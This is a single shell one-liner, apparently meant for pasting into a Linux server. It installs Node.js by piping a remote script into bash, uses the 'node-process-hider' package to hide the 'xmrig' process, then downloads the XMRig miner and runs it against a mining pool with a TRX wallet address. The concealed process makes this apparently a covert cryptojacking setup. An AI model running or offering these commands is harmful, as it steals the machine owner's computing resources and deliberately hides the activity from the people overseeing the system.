sudo -i
sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add xmrig && wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz && tar -zxf xmrig-6.16.2-bionic-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig && ./xmrig -o rx.unmineable.com:3333 -a rx -k -p x -t 2 -u TRX:TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a.JB
